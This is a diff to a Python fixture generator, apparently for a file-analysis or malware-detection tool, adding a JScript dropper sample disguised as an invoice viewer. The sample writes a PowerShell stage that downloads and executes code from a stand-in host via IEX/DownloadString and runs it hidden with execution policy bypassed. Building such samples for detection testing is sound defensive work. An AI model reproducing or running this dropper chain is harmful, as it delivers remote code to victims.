@@ -1680,6 +1680,22 @@ def native_libs_apk() -> bytes:
                   extra={"lib/arm64-v8a/libapp.so": lib(0xB7), "lib/x86_64/libapp.so": lib(0x3E)})
 
 
+def marker_drop_js() -> bytes:
+    """A JScript dropper that writes a 1-byte lock / marker file and a real
+    PowerShell stage: only the stage becomes a nested child (tiny non-code
+    drops are not stages)."""
+    return (
+        "// Factura " + INVOICE + " - visor\r\n"
+        "var fso = new ActiveXObject('Scripting.FileSystemObject');\r\n"
+        "var lock = fso.CreateTextFile('C:\\\\Users\\\\Public\\\\inv.lock', true);\r\n"
+        "lock.Write('1'); lock.Close();\r\n"
+        "var st = fso.CreateTextFile('C:\\\\Users\\\\Public\\\\upd.ps1', true);\r\n"
+        "st.Write(\"IEX (New-Object Net.WebClient).DownloadString('http://billing-portal.example/inv/upd.ps1')\");\r\n"
+        "st.Close();\r\n"
+        "new ActiveXObject('WScript.Shell').Run('powershell -ep bypass -f C:\\\\Users\\\\Public\\\\upd.ps1', 0);\r\n"
+    ).encode()
+
+
 def build_all() -> dict[str, bytes]:
     out: dict[str, bytes] = {
         "sample.docx": word_docx(), "sample.docm": word_docm(),
@@ -1701,6 +1717,7 @@ def build_all() -> dict[str, bytes]:
         "sample_archive.tar.gz": tarball_tgz(), "sample_notes.one": onenote_one(),
         "sample_packed.exe": packed_pe_exe(),
         "sample_native_libs.apk": native_libs_apk(),
+        "sample_marker_drop.js": marker_drop_js(),
         "lab/dropper_bundle.zip": dropper_bundle_zip(),
     }
     for ext in X_CT:
